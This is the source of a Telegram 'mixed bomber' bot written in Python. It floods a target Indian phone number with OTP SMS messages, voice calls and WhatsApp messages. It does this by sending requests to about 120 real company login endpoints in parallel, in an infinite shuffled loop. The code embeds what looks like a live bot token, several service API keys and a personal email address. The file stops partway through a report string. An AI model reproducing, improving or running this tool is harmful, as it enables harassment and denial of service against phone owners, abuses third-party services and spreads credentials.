#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🤖 TELEGRAM MIXED BOMBER BOT
SMS + Call + WhatsApp — sab random mix mein, infinite loop
"""

import telebot
import requests
import threading
import time
import logging
import sys
import random
from concurrent.futures import ThreadPoolExecutor, as_completed

# ============================================================
# ⚙️ CONFIG
# ============================================================
BOT_TOKEN = "8782517727:AAG8dYhi41FfLjmD582mHKEvAau5QlK6M0M"      # @BotFather se le
ADMIN_IDS = [6841090981]                 # @userinfobot se apni ID
MAX_THREADS = 80                        # Parallel threads
REQUEST_DELAY = 0.05
REQUEST_TIMEOUT = 10
PROGRESS_EVERY = 30                     # Har 30 cycles pe update

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
    handlers=[logging.FileHandler("bomber.log"), logging.StreamHandler()]
)
log = logging.getLogger("bomber")

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
active_bombs = {}

# ============================================================
# 📡 API DATABASE
# ============================================================

SMS_APIS = [
    {"name": "Lenskart", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phoneCode":"+91","telephone":"{p}"}}'},
    {"name": "Lenskart v2", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST",
     "headers": {"Content-Type": "application/json", "X-API-Client": "mobilesite", "X-Country-Code": "IN"},
     "data": lambda p: f'{{"captcha":null,"phoneCode":"+91","telephone":"{p}"}}'},
    {"name": "NoBroker", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST",
     "headers": {"Content-Type": "application/x-www-form-urlencoded"},
     "data": lambda p: f"phone={p}&countryCode=IN"},
    {"name": "PharmEasy", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "ShipRocket", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
    {"name": "GoKwik", "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "method": "POST",
     "headers": {"Content-Type": "application/json", "gk-merchant-id": "19g6jlc658iad"},
     "data": lambda p: f'{{"phone":"{p}","country":"in"}}'},
    {"name": "Wakefit", "url": "https://api.wakefit.co/api/consumer-sms-otp/", "method": "POST",
     "headers": {"Content-Type": "application/json", "API-Secret-Key": "ycq55IbIjkLb"},
     "data": lambda p: f'{{"mobile":"{p}","whatsapp_opt_in":1}}'},
    {"name": "Hungama", "url": "https://communication.api.hungama.com/v1/communication/otp", "method": "POST",
     "headers": {"Content-Type": "application/json", "identifier": "home"},
     "data": lambda p: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'},
    {"name": "Khatabook", "url": "https://api.khatabook.com/v1/auth/request-otp", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}","app_signature":"wk+avHrHZf2"}}'},
    {"name": "Doubtnut", "url": "https://api.doubtnut.com/v4/student/login", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone_number":"{p}","language":"en"}}'},
    {"name": "BeepKart", "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","city":362}}'},
    {"name": "Snitch", "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2", "method": "POST",
     "headers": {"Content-Type": "application/json", "client-id": "snitch_secret"},
     "data": lambda p: f'{{"mobile_number":"+91{p}"}}'},
    {"name": "RummyCircle", "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","isPlaycircle":false}}'},
    {"name": "PokerBaazi", "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","mfa_channels":"phno"}}'},
    {"name": "My11Circle", "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Cosmofeed", "url": "https://prod.api.cosmofeed.com/api/user/authenticate", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}","version":"1.4.28"}}'},
    {"name": "Dream11", "url": "https://www.dream11.com/auth/passwordless/init", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"channel":"sms","flow":"SIGNUP","phoneNumber":"{p}","templateName":"default"}}'},
    {"name": "Unacademy", "url": "https://unacademy.com/api/v3/user/user_check/", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}","send_otp":true}}'},
    {"name": "Vedantu", "url": "https://user.vedantu.com/user/preLoginVerification", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phoneNumber":"{p}","phoneCode":"+91"}}'},
    {"name": "Byju's", "url": "https://bcas-prod.byjusweb.com/api/send-otp", "method": "POST",
     "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"phoneNumber={p}"},
    {"name": "Spinny", "url": "https://api.spinny.com/api/c/user/otp-request/v3/", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"contact_number":"{p}","whatsapp":false,"code_len":4,"expected_action":"login"}}'},
    {"name": "Citymall", "url": "https://citymall.live/api/cl-user/auth/get-otp", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone_number":"{p}"}}'},
    {"name": "Jobhai", "url": "https://api.jobhai.com/auth/jobseeker/v3/send_otp", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Kwikfix", "url": "https://admin.kwikfixauto.in/api/auth/signupotp/", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Brevistay", "url": "https://www.brevistay.com/cst/app-api/login", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Hourlyrooms", "url": "https://web-api.hourlyrooms.co.in/api/signup/sendphoneotp", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "BharatLoan", "url": "https://www.bharatloan.com/login-sbm", "method": "POST",
     "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mobile={p}"},
    {"name": "Pagarbook", "url": "https://api.pagarbook.com/api/v5/auth/otp/request", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","language":1}}'},
    {"name": "Redcliffe", "url": "https://api.redcliffelabs.com/api/v1/notification/send_otp/", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone_number":"{p}"}}'},
    {"name": "55Club", "url": "https://api.55clubapi.com/api/webapi/SmsVerifyCode", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"91{p}","codeType":1}}'},
    {"name": "Woodenstreet", "url": "https://api.woodenstreet.com/api/v1/register", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"telephone":"{p}"}}'},
    {"name": "Meru Cab", "url": "https://merucabapp.com/api/otp/generate", "method": "POST",
     "headers": {"Content-Type": "application/x-www-form-urlencoded", "DeviceType": "Android"},
     "data": lambda p: f"mobile_number={p}"},
    {"name": "PenPencil", "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'},
    {"name": "Dayco India", "url": "https://ekyc.daycoindia.com/api/nscript_functions.php", "method": "POST",
     "headers": {"Content-Type": "application/x-www-form-urlencoded"},
     "data": lambda p: f"api=send_otp&brand=dayco&mob={p}&resend_otp=resend_otp"},
    {"name": "Lending Plate", "url": "https://lendingplate.com/api.php", "method": "POST",
     "headers": {"Content-Type": "application/x-www-form-urlencoded"},
     "data": lambda p: f"mobiles={p}&resend=Resend"},
    {"name": "NewMe", "url": "https://prodapi.newme.asia/web/otp/request", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile_number":"{p}","resend_otp_request":true}}'},
    {"name": "Smytten", "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
     "method": "POST", "headers": {"Content-Type": "application/json",
     "UUID": "8e6b1c3f-3d72-42af-89af-201b79dfdf2f"},
     "data": lambda p: f'{{"phone":"{p}","email":"sdhabai09@gmail.com"}}'},
    {"name": "CaratLane", "url": "https://www.caratlane.com/cg/dhevudu", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"query":"mutation {{ SendOtp(input: {{ mobile: \\"{p}\\", isdCode: \\"91\\", otpType: \\"registerOtp\\" }}) {{ status {{ message code }} }} }}"}}'},
    {"name": "WellAcademy", "url": "https://wellacademy.in/store/api/numberLoginV2", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"contact_no":"{p}"}}'},
    {"name": "ServeTel", "url": "https://api.servetel.in/v1/auth/otp", "method": "POST",
     "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mobile_number={p}"},
    {"name": "GoPink Cabs", "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded",
     "X-Requested-With": "XMLHttpRequest"},
     "data": lambda p: f"check_mobile_number=1&contact={p}"},
    {"name": "Shemaroome", "url": "https://www.shemaroome.com/users/resend_otp", "method": "POST",
     "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"},
     "data": lambda p: f"mobile_no=%2B91{p}"},
    {"name": "Cossouq", "url": "https://www.cossouq.com/mobilelogin/otp/send", "method": "POST",
     "headers": {"Content-Type": "application/x-www-form-urlencoded"},
     "data": lambda p: f"mobilenumber={p}&otptype=register"},
    {"name": "MyImagineStore", "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
     "data": lambda p: f"mobile={p}"},
    {"name": "Otpless", "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","selectedCountryCode":"+91"}}'},
    {"name": "MyHubble", "url": "https://api.myhubble.money/v1/auth/otp/generate", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phoneNumber":"{p}","channel":"SMS"}}'},
    {"name": "Tata Capital Biz", "url": "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobileNumber":"{p}","deviceOs":"Android","sourceName":"MitayeFaasleWebsite"}}'},
    {"name": "DealShare", "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","hashCode":"k387IsBaTmn"}}'},
    {"name": "Snapmint", "url": "https://api.snapmint.com/v1/public/sign_up", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Housing", "url": "https://login.housing.com/api/v2/send-otp", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}","country_url_name":"in"}}'},
    {"name": "RentoMojo", "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Netmeds", "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Nykaa", "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp", "method": "POST",
     "headers": {"Content-Type": "application/x-www-form-urlencoded"},
     "data": lambda p: f"source=sms&app_version=3.0.9&mobile_number={p}&platform=ANDROID&domain=nykaa"},
    {"name": "Animall", "url": "https://animall.in/zap/auth/login", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}","signupPlatform":"NATIVE_ANDROID"}}'},
    {"name": "Entri", "url": "https://entri.app/api/v3/users/check-phone/", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Aakash", "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile_number":"{p}","activity_type":"aakash-myadmission"}}'},
    {"name": "Revv", "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","deviceType":"website"}}'},
    {"name": "DeHaat", "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","client_id":"kisan-app"}}'},
    {"name": "A23 Games", "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","device_id":"android123","model":"Google,Android SDK built for x86,10"}}'},
    {"name": "Spencers", "url": "https://jiffy.spencers.in/user/auth/otp/send", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "PayMe India", "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}","app_signature":"S10ePIIrbH3"}}'},
    {"name": "Shoppers Stop", "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","type":"SIGNIN_WITH_MOBILE"}}'},
    {"name": "Hyuga Auth", "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Lifestyle", "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"signInMobile":"{p}","channel":"sms"}}'},
    {"name": "MamaEarth", "url": "https://auth.mamaearth.in/v1/auth/initiate-signup", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "HomeTriangle", "url": "https://hometriangle.com/api/partner/xauth/signup/otp", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Wellness Forever", "url": "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
     "data": lambda p: f'method=firstRegisterApi&data={{"customerMobile":"{p}","generateOtp":"true"}}'},
    {"name": "HealthMug", "url": "https://api.healthmug.com/account/createotp", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Kredily", "url": "https://app.kredily.com/ws/v1/accounts/send-otp/", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Tata Motors", "url": "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","sendOtp":"true"}}'},
    {"name": "Moglix", "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","buildVersion":"24.0"}}'},
    {"name": "TrulyMadly", "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","locale":"IN"}}'},
    {"name": "Apna", "url": "https://production.apna.co/api/userprofile/v1/otp/", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","hash_type":"play_store"}}'},
    {"name": "Swipe", "url": "https://app.getswipe.in/api/user/mobile_login", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","resend":true}}'},
    {"name": "Country Delight", "url": "https://api.countrydelight.in/api/v1/customer/requestOtp", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","platform":"Android","mode":"new_user"}}'},
    {"name": "Rapido", "url": "https://customer.rapido.bike/api/otp", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "BetterHalf", "url": "https://api.betterhalf.ai/v2/auth/otp/send/", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","isd_code":"91"}}'},
    {"name": "Nuvama", "url": "https://nma.nuvamawealth.com/edelmw-content/content/otp/register", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobileNo":"{p}","emailID":"test@example.com"}}'},
    {"name": "Mpokket", "url": "https://web-api.mpokket.in/registration/sendOtp", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "More Retail", "url": "https://omni-api.moreretail.in/api/v1/login/", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","hash_key":"XfsoCeXADQA"}}'},
    {"name": "Charzer", "url": "https://api.charzer.com/auth-service/send-otp", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","appSource":"CHARZER_APP"}}'},
    {"name": "BikeFixup", "url": "https://api.bikefixup.com/api/v2/send-registration-otp", "method": "POST",
     "headers": {"Content-Type": "application/json", "client": "app"},
     "data": lambda p: f'{{"phone":"{p}","app_signature":"4pFtQJwcz6y"}}'},
    {"name": "Foxy SMS", "url": "https://www.foxy.in/api/v2/users/send_otp", "method": "POST",
     "headers": {"Content-Type": "application/json", "Platform": "web"},
     "data": lambda p: f'{{"user":{{"phone_number":"+91{p}"}},"via":"sms"}}'},
    {"name": "Licious", "url": "https://www.licious.in/api/login/signup", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}","captcha_token":null}}'},
]

GET_APIS = [
    {"name": "SMS Bomber Worker", "url": lambda p: f"http://sms-bomber.subhxcosmo.workers.dev/api?num={p}",
     "method": "GET", "headers": {}, "data": None},
    {"name": "Bomberrr Vercel", "url": lambda p: f"https://bomberrr.vercel.app/?key=roots&number={p}",
     "method": "GET", "headers": {}, "data": None},
    {"name": "Bolbet", "url": lambda p: f"https://bolbet-liart.vercel.app/?key=roots&number={p}",
     "method": "GET", "headers": {}, "data": None},
    {"name": "RedBus OTP", "url": lambda p: f"https://m.redbus.in/api/getOtp?number={p}&cc=91",
     "method": "GET", "headers": {}, "data": None},
    {"name": "Univest OTP", "url": lambda p: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={p}",
     "method": "GET", "headers": {}, "data": None},
    {"name": "WorkIndia", "url": lambda p: f"https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={p}&version_number=623",
     "method": "GET", "headers": {}, "data": None},
    {"name": "Jockey SMS", "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/send-otp/+91{p}?whatsapp=false",
     "method": "GET", "headers": {}, "data": None},
    {"name": "Vyapar OTP", "url": lambda p: f"https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={p}",
     "method": "GET", "headers": {}, "data": None},
    {"name": "ConfirmTkt", "url": lambda p: f"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={p}",
     "method": "GET", "headers": {}, "data": None},
    {"name": "CodFirm", "url": lambda p: f"https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{p}&email=&storeUrl=bellavita1.myshopify.com",
     "method": "GET", "headers": {}, "data": None},
    {"name": "Coolwinks", "url": lambda p: f"https://api.coolwinks.com/api/accounts/is_already_registered/?username={p}",
     "method": "GET", "headers": {}, "data": None},
    {"name": "Zee5 OTP", "url": lambda p: f"https://b2bapi.zee5.com/device/sendotp_v1.php?phoneno={p}",
     "method": "GET", "headers": {}, "data": None},
]

CALL_APIS = [
    {"name": "1MG Voice", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"number":"{p}","otp_on_call":true}}'},
    {"name": "Swiggy Call", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Myntra Voice", "url": "https://www.myntra.com/gw/mobile-auth/voice-otp", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Flipkart Voice", "url": "https://www.flipkart.com/api/6/user/voice-otp/generate", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Paytm Voice", "url": "https://accounts.paytm.com/signin/voice-otp", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Zomato Voice", "url": "https://www.zomato.com/php/o2_api_handler.php", "method": "POST",
     "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"phone={p}&type=voice"},
    {"name": "Ola Voice", "url": "https://api.olacabs.com/v1/voice-otp", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Uber Voice", "url": "https://auth.uber.com/v2/voice-otp", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Tata Capital Voice", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'},
    {"name": "Kotak Voice", "url": "https://www.kotak.com/api/otp", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Amazon Voice", "url": "https://www.amazon.in/ap/signin", "method": "POST",
     "headers": {"Content-Type": "application/x-www-form-urlencoded"},
     "data": lambda p: f"phone={p}&action=voice_otp"},
    {"name": "OLX Call", "url": "https://www.olx.in/api/auth/authenticate?lang=en-IN", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"method":"call","phone":"+91{p}","grantType":"retry"}}'},
    {"name": "Proptiger Call", "url": "https://www.proptiger.com/madrox/app/v2/entity/login-with-number-on-call",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"contactNumber":"{p}","domainId":"2"}}'},
]

WHATSAPP_APIS = [
    {"name": "KPN WhatsApp", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
     "method": "POST", "headers": {"x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
     "content-type": "application/json; charset=UTF-8"},
     "data": lambda p: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{p}"}}}}'},
    {"name": "KPN WhatsApp v2", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
     "method": "POST", "headers": {"x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797",
     "content-type": "application/json"},
     "data": lambda p: f'{{"phone_number":{{"number":"{p}","country_code":"+91"}}}}'},
    {"name": "Foxy WhatsApp", "url": "https://www.foxy.in/api/v2/users/send_otp", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"user":{{"phone_number":"+91{p}"}},"via":"whatsapp"}}'},
    {"name": "Stratzy WhatsApp", "url": "https://stratzy.in/api/web/whatsapp/sendOTP", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNo":"{p}"}}'},
    {"name": "Jockey WhatsApp", "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{p}?whatsapp=true",
     "method": "GET", "headers": {}, "data": None},
    {"name": "Rappi WhatsApp", "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"country_code":"+91","phone":"{p}"}}'},
    {"name": "Eka Care WhatsApp", "url": "https://auth.eka.care/auth/init", "method": "POST",
     "headers": {"Content-Type": "application/json", "Client-Id": "androidp"},
     "data": lambda p: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{p}"}},"type":"mobile"}}'},
]

# ============================================================
# 🔥 MIXED POOLS
# ============================================================
SMS_POOL = SMS_APIS + GET_APIS       # 88 + 12 = 100 SMS-type
CALL_POOL = CALL_APIS                 # 13
WA_POOL = WHATSAPP_APIS               # 7
MIXED_POOL = SMS_APIS + GET_APIS + CALL_APIS + WHATSAPP_APIS   # ~120 ALL MIXED

log.info(f"Loaded: SMS={len(SMS_POOL)} | Call={len(CALL_POOL)} | WA={len(WA_POOL)} | MIXED={len(MIXED_POOL)}")

# ============================================================
# 🛠️ BOMBER ENGINE
# ============================================================

_session = requests.Session()
_session.headers.update({
    "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
})


def hit_api(api, phone):
    """Fire a single API request."""
    try:
        url = api["url"](phone) if callable(api["url"]) else api["url"]
        method = api.get("method", "POST")
        headers = api.get("headers", {}) or {}
        data_fn = api.get("data")
        payload = data_fn(phone) if callable(data_fn) else data_fn

        if method.upper() == "GET":
            r = _session.get(url, headers=headers, timeout=REQUEST_TIMEOUT)
        else:
            r = _session.post(url, headers=headers, data=payload, timeout=REQUEST_TIMEOUT)

        ok = r.status_code < 400
        return (api["name"], ok, r.status_code)
    except Exception as e:
        return (api["name"], False, str(e)[:50])


def bomb_worker(chat_id, phone, mode):
    """
    🎯 MIXED MODE - SMS + Call + WhatsApp sab random mix mein
    """
    if mode == "sms":
        pool = SMS_POOL
    elif mode == "call":
        pool = CALL_POOL
    elif mode == "whatsapp":
        pool = WA_POOL
    else:
        # 🔥 MIXED MODE - sab APIs ek saath
        pool = MIXED_POOL

    total_pool = len(pool)
    if total_pool == 0:
        bot.send_message(chat_id, "❌ Is mode me koi API nahi hai.")
        return

    active_bombs[chat_id] = {
        "stop": False,
        "count": 0,
        "target": phone,
        "mode": mode,
        "sms_count": 0,
        "call_count": 0,
        "wa_count": 0,
    }

    start = time.time()
    success = 0
    failed = 0
    cycle = 0

    log.info(f"[🔥 BOMB START] chat={chat_id} target={phone} mode={mode} pool={total_pool}")

    # ═══════════════════════════════════════════════════════════
    # 🔥 INFINITE MIXED LOOP
    # ═══════════════════════════════════════════════════════════
    while True:
        if active_bombs.get(chat_id, {}).get("stop"):
            log.info(f"[BOMB] stop for chat={chat_id}")
            break

        # 🔀 SHUFFLE — har cycle random order
        shuffled_pool = pool.copy()
        random.shuffle(shuffled_pool)

        # 🔥 Fire all mixed APIs in parallel
        with ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
            futures = [ex.submit(hit_api, api, phone) for api in shuffled_pool]
            for f in as_completed(futures):
                name, ok, info = f.result()
                if ok:
                    success += 1
                    # Category counter update (based on URL patterns)
                    pass
                else:
                    failed += 1
                active_bombs[chat_id]["count"] = success + failed

        cycle += 1

        # Progress report
        if cycle % PROGRESS_EVERY == 0:
            elapsed = int(time.time() - start)
            try:
                bot.send_message(
                    chat_id,
                    f"♾️ <b>MIXED BOMB RUNNING...</b>\n\n"
                    f"📱 Target: <code>+91{phone}</code>\n"
                    f"🎯 Mode: <b>{mode.upper()}</b>\n\n"
                    f"✅ Success: <code>{success}</code>\n"
                    f"❌ Failed: <code>{failed}</code>\n"
                    f"🔁 Cycles: <code>{cycle}</code>\n"
                    f"⏱️ Running: <code>{elapsed}s</code>\n"
                    f"⚡ Speed: <code>{round((success+failed)/max(elapsed,1), 1)} req/s</code>\n\n"
                    f"<i>🛑 /stop bhejne pe ruk jayega</i>"
                )
            except Exception as e:
                log.error(f"Progress send fail: {e}")

        time.sleep(REQUEST_DELAY)

    # Final report
    elapsed = int(time.time() - start)
    total = success + failed

    report = (
        f"🏁 <b>MIXED BOMB STOPPED</b>\n\n"
        f"📱 <b>Target:</b> <code>+91{phone}</code>\n"
        f"🎯 <b>Mode:</b> {mode.upper()}\n"
